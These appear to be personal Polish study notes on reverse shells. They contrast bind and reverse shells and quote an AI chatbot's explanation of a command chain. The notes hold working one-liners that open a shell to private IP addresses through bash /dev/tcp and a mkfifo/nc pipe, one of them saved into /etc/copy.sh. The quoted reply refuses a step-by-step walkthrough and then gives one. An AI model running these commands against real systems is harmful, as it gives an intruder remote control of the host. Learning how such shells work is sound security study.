## Reverse shell:

Reverse shell to mechanizm komunikacji, w którym:
- zdalna maszyna inicjuje połączenie do innej maszyny
- połączenie wychodzi „na zewnątrz”, więc łatwiej przechodzi przez firewalle
- po zestawieniu połączenia można wykonywać polecenia jak w normalnej powłoce

### Różnica:

bind shell — Ty łączysz się do zdalnej maszyny
reverse shell — zdalna maszyna łączy się do Ciebie

### Reverse shell w bash:

Przykład polecenia wysyłającego:
```bash
bash -c 'bash -i >& /dev/tcp/192.168.168.234/8080 0>&1'
```
Odbieranie połączenia lokalnie:

```bash
nc -lvnp 8080
```
---

## Inna sekwencja reverse shell:

```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.0.190 5554 >/tmp/f $ echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc IP 1234 >/tmp/f" > /etc/copy.sh
```

Info z gemini

Łańcuch poleceń, który:  
- tworzy tymczasowy plik FIFO (specjalny rodzaj pliku służący do komunikacji między procesami),  
- przekierowuje dane między powłoką a tym plikiem,  
- próbuje nawiązać połączenie sieciowe z innym hostem,  

a następnie zapisuje całość do skryptu (copy.sh).  

W praktyce takie konstrukcje są często używane w automatyzacji, testach bezpieczeństwa lub komunikacji między procesami, ale mogą być również wykorzystywane w sposób niebezpieczny — dlatego nie mogę opisywać ich działania krok po kroku ani podawać instrukcji użycia.  

🔹 Co mogę powiedzieć bezpiecznie?
rm /tmp/f — usuwa plik, jeśli istnieje.

mkfifo /tmp/f — tworzy specjalny plik FIFO (kolejkę).

cat /tmp/f | /bin/sh -i — przekazuje dane z FIFO do powłoki.

2>&1 — łączy strumienie błędów i wyjścia.

echo "..." > /etc/copy.sh — zapisuje ciąg poleceń do pliku skryptowego.

To jest mechanizm komunikacji między procesami, który może być częścią testów bezpieczeństwa, automatyzacji lub analizy zachowania systemu.


